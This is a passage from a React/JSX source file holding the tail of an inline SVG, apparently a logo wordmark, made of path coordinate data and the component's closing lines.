10.4336 65.0243 11.0681C65.0243 12.464 64.4659 13.5554 63.3746 14.3676C62.3086 15.2305 60.8619 15.6366 59.0853 15.6366Z"></path>
    <path d="M73.4516 15.6366C71.1928 15.6366 69.4162 14.9513 68.1218 13.5554C66.8274 12.1595 66.1929 10.3828 66.1929 8.20014C66.1929 6.04281 66.8274 4.34233 68.1218 2.94641C69.4162 1.52511 71.0659 0.839844 73.0963 0.839844C75.3044 0.839844 77.0049 1.60125 78.1978 3.12407C79.3653 4.62151 79.9744 6.5758 79.9998 9.03769C79.9998 9.16459 79.8982 9.26611 79.7713 9.26611H70.1014C69.9492 9.26611 69.8476 9.39302 69.873 9.5453C70.0507 10.5351 70.406 11.2965 70.9644 11.8549C71.5735 12.464 72.3857 12.7686 73.4263 12.7686C74.746 12.7686 75.609 12.2356 76.0658 11.1696C76.0912 11.0935 76.1927 11.0427 76.2689 11.0427H79.4922C79.6444 11.0427 79.746 11.195 79.7206 11.3219C79.416 12.5148 78.7308 13.5046 77.7155 14.3168C76.5988 15.2051 75.1775 15.6366 73.4516 15.6366ZM73.1471 3.68244C71.4212 3.68244 70.3552 4.59613 69.9492 6.42352C69.9238 6.5758 70.0253 6.7027 70.1776 6.7027H75.8628C75.9897 6.7027 76.1166 6.5758 76.0912 6.4489C75.9897 5.66211 75.7105 5.0276 75.2029 4.51999C74.6953 3.96162 73.9846 3.68244 73.1471 3.68244Z"></path>
  </svg>
);